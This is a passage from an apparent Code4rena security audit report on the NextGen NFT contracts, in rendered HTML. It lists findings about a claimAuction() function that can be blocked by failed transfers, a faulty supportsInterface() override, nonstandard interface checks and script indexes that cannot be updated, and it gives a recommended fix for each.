class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">claimAuction</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">WinnerOrAdminRequired</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">,this.claimAuction.selector){</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">/// ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">=</span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">&lt; </span><span class=\"mtk12\">auctionInfoData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">].</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> ++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">auctionInfoData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">][</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">bidder</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">highestBidder</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">auctionInfoData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">][</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">bid</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">highestBid</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">auctionInfoData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">][</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">status</span><span class=\"mtk1\"> == </span><span class=\"mtk4\">true</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  -&gt;            </span><span class=\"mtk11\">IERC721</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gencore</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ownerOfToken</span><span class=\"mtk1\">, </span><span class=\"mtk12\">highestBidder</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">success</span><span class=\"mtk1\">, ) = </span><span class=\"mtk11\">payable</span><span class=\"mtk1\">(</span><span class=\"mtk11\">owner</span><span class=\"mtk1\">()).</span><span class=\"mtk12\">call</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">highestBid</span><span class=\"mtk1\">}(</span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ClaimAuction</span><span class=\"mtk1\">(</span><span class=\"mtk11\">owner</span><span class=\"mtk1\">(), </span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">, </span><span class=\"mtk12\">success</span><span class=\"mtk1\">, </span><span class=\"mtk12\">highestBid</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">auctionInfoData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">][</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">status</span><span class=\"mtk1\"> == </span><span class=\"mtk4\">true</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">success</span><span class=\"mtk1\">, ) = </span><span class=\"mtk11\">payable</span><span class=\"mtk1\">(</span><span class=\"mtk12\">auctionInfoData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">][</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">bidder</span><span class=\"mtk1\">).</span><span class=\"mtk12\">call</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">auctionInfoData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">][</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">bid</span><span class=\"mtk1\">}(</span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Refund</span><span class=\"mtk1\">(</span><span class=\"mtk12\">auctionInfoData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">][</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">bidder</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">, </span><span class=\"mtk12\">success</span><span class=\"mtk1\">, </span><span class=\"mtk12\">highestBid</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L112\">AuctionDemo.sol#L113</a></p>\n<p>If for any reason the <code>ownerOfToken</code> didnâ€™t approve the token, move it, its address is compromised, or decided not to transfer it, the whole transaction will revert, preventing any participant to receive their funds.</p>\n<h3 id=\"recommendation-7\" style=\"position:relative;\"><a href=\"#recommendation-7\" aria-label=\"recommendation 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<p>Mint the airdropped token to a escrow contract with an approval to be transferred upon a call from the <code>claimAuction()</code> function.</p>\n<h2 id=\"10-the-receiver-of-the-funds-from-claimauction-should-be-moved-to-another-function\" style=\"position:relative;\"><a href=\"#10-the-receiver-of-the-funds-from-claimauction-should-be-moved-to-another-function\" aria-label=\"10 the receiver of the funds from claimauction should be moved to another function permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[10] The receiver of the funds from <code>claimAuction()</code> should be moved to another function</h2>\n<p>Despite being a trusted role, if the owner account is compromised, or is moved to a contract that canâ€™t accept Ether, the whole <code>claimAuction()</code> will be blocked, preventing bidders from getting their bid back, and the auction winner from getting the NFT.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"56\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">claimAuction</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">WinnerOrAdminRequired</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">,this.claimAuction.selector){</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">/// ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">=</span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">&lt; </span><span class=\"mtk12\">auctionInfoData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">].</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> ++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">auctionInfoData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">][</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">bidder</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">highestBidder</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">auctionInfoData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">][</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">bid</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">highestBid</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">auctionInfoData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">][</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">status</span><span class=\"mtk1\"> == </span><span class=\"mtk4\">true</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk11\">IERC721</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gencore</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ownerOfToken</span><span class=\"mtk1\">, </span><span class=\"mtk12\">highestBidder</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">-&gt;              (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">success</span><span class=\"mtk1\">, ) = </span><span class=\"mtk11\">payable</span><span class=\"mtk1\">(</span><span class=\"mtk11\">owner</span><span class=\"mtk1\">()).</span><span class=\"mtk12\">call</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">highestBid</span><span class=\"mtk1\">}(</span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ClaimAuction</span><span class=\"mtk1\">(</span><span class=\"mtk11\">owner</span><span class=\"mtk1\">(), </span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">, </span><span class=\"mtk12\">success</span><span class=\"mtk1\">, </span><span class=\"mtk12\">highestBid</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">auctionInfoData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">][</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">status</span><span class=\"mtk1\"> == </span><span class=\"mtk4\">true</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">success</span><span class=\"mtk1\">, ) = </span><span class=\"mtk11\">payable</span><span class=\"mtk1\">(</span><span class=\"mtk12\">auctionInfoData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">][</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">bidder</span><span class=\"mtk1\">).</span><span class=\"mtk12\">call</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">auctionInfoData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">][</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">bid</span><span class=\"mtk1\">}(</span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Refund</span><span class=\"mtk1\">(</span><span class=\"mtk12\">auctionInfoData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">][</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">bidder</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">, </span><span class=\"mtk12\">success</span><span class=\"mtk1\">, </span><span class=\"mtk12\">highestBid</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L113\">AuctionDemo.sol#L113</a></p>\n<h3 id=\"recommendation-8\" style=\"position:relative;\"><a href=\"#recommendation-8\" aria-label=\"recommendation 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<p>Move the logic to transfer funds from the auction to a separate function.</p>\n<h2 id=\"11-use-supportsinterface-from-eip-165-instead-of-custom-made-checks\" style=\"position:relative;\"><a href=\"#11-use-supportsinterface-from-eip-165-instead-of-custom-made-checks\" aria-label=\"11 use supportsinterface from eip 165 instead of custom made checks permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[11] Use <code>supportsInterface()</code> from EIP-165 instead of custom-made checks</h2>\n<p><a href=\"https://eips.ethereum.org/EIPS/eip-165\">EIP-165</a> defines â€œa standard method to publish and detect what interfaces a smart contract implementsâ€. But the contracts in scope define custom-made checks that are not standard and make integrations more difficult.</p>\n<p>Instances:</p>\n<ul>\n<li>\n<p><code>isAdminContract()</code></p>\n<ul>\n<li>Defined in <a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/NextGenAdmins.sol#L83-L85\">NextGenAdmins.sol#L83-L85</a></li>\n<li>Used in:</li>\n<li><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/MinterContract.sol#L455\">MinterContract.sol#L455</a></li>\n<li><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/NextGenCore.sol#L323\">NextGenCore.sol#L323</a></li>\n<li><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/RandomizerVRF.sol#L95\">RandomizerVRF.sol#L95</a></li>\n<li><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/RandomizerRNG.sol#L62\">RandomizerRNG.sol#L62</a></li>\n</ul>\n</li>\n<li>\n<p><code>isRandomizerContract()</code></p>\n<ul>\n<li>\n<p>Defined in:</p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/RandomizerNXT.sol#L62-L64\">RandomizerNXT.sol#L62-L64</a></li>\n<li><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/RandomizerRNG.sol#L89-L91\">RandomizerRNG.sol#L89-L91</a></li>\n<li><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/RandomizerVRF.sol#L105-L107\">RandomizerVRF.sol#L105-L107</a></li>\n</ul>\n</li>\n<li>Used in <a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/NextGenCore.sol#L171\">NextGenCore.sol#L171</a></li>\n</ul>\n</li>\n<li>\n<p><code>isMinterContract()</code></p>\n<ul>\n<li>Defined in <a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/MinterContract.sol#L506-L508\">MinterContract.sol#L506-L508</a></li>\n<li>Used in <a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/NextGenCore.sol#L316\">NextGenCore.sol#L316</a></li>\n</ul>\n</li>\n</ul>\n<h3 id=\"recommendation-9\" style=\"position:relative;\"><a href=\"#recommendation-9\" aria-label=\"recommendation 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<p>Implement the EIP-165 standard with <code>supportsInterface()</code>.</p>\n<h2 id=\"12-supportsinterface-is-incorrectly-implemented-on-nextgencore\" style=\"position:relative;\"><a href=\"#12-supportsinterface-is-incorrectly-implemented-on-nextgencore\" aria-label=\"12 supportsinterface is incorrectly implemented on nextgencore permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[12] <code>supportsInterface()</code> is incorrectly implemented on <code>NextGenCore</code></h2>\n<p>The current implementation removes the support of <code>ERC721Enumerable</code> for the <code>NextGenCore</code> contract, as <code>super.supportsInterface(interfaceId)</code> will return the supported interface of the rightmost overridden contract, which is <code>ERC2981</code>.</p>\n<p>This will break any possible integration that expects the contract to support the interface of <code>ERC721Enumerable</code>, including the NFT interface for <code>ERC721</code>. This could be for example an NFT lending protocol that expects the NFT contract supports it (in this case <code>NextGenCore</code>).</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"57\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">supportsInterface</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bytes4</span><span class=\"mtk1\"> </span><span class=\"mtk12\">interfaceId</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">virtual</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ERC721Enumerable</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ERC2981</span><span class=\"mtk1\">) </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) { </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk4\">super</span><span class=\"mtk1\">.</span><span class=\"mtk11\">supportsInterface</span><span class=\"mtk1\">(</span><span class=\"mtk12\">interfaceId</span><span class=\"mtk1\">); </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/NextGenCore.sol#L337-L339\">NextGenCore.sol#L337-L339</a></p>\n<h3 id=\"recommendation-10\" style=\"position:relative;\"><a href=\"#recommendation-10\" aria-label=\"recommendation 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<p>Add the contract support for the <code>ERC721Enumerable</code> interface in <code>supportsInterface()</code>.</p>\n<h2 id=\"13-collection-scripts-with-indexes-999-and-1000-cant-be-updated\" style=\"position:relative;\"><a href=\"#13-collection-scripts-with-indexes-999-and-1000-cant-be-updated\" aria-label=\"13 collection scripts with indexes 999 and 1000 cant be updated permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[13] Collection scripts with indexes <code>999</code> and <code>1000</code> canâ€™t be updated</h2>\n<p><code>NextGenCore::createCollection()</code> allows the creation of an unbounded array of generative scripts for the collection: <a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/NextGenCore.sol#L138\">NextGenCore.sol#L138</a>.</p>\n<p>But it doesnâ€™t allow updating scripts with index <code>999</code> and <code>1000</code>, as the <code>updateCollectionInfo()</code> function overuses the <code>index</code> attribute to conditionally update other collection properties.</p>\n<p><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/NextGenCore.sol#L240-L252\">NextGenCore.sol#L240-L252</a></p>\n<p>This makes it impossible to update those values, bricking the contract functionality.</p>\n<h3 id=\"recommendation-11\" style=\"position:relative;\"><a href=\"#recommendation-11\" aria-label=\"recommendation 11 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<p>The recommendation would be to refactor the <code>updateCollectionInfo()</code> function, so that it doesnâ€™t use the <code>index</code> for multiple purposes, and allow the update of any element on the scripts array.</p>\n<p>Another possible but not recommended solution would be to limit the scripts size to <code>&#x3C; 999</code>.</p>\n<h2 id=\"14-it-is-not-possible-to-add-or-remove-generative-scripts\" style=\"position:relative;\"><a href=\"#14-it-is-not-possible-to-add-or-remove-generative-scripts\" aria-label=\"14 it is not possible to add or remove generative scripts permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 